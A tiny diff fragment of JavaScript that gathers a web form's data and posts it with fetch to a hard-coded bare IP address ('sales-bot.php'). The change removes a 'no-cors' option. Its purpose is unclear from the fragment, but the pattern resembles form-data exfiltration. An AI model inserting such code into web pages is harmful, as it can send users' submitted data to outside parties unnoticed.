@@ -37,7 +37,6 @@ for (const pair of formData){
 
 fetch("http://80.211.107.117/sales/sales-bot.php",{
 method: 'post',
-mode:"no-cors",
 body:sParams
 })
 });
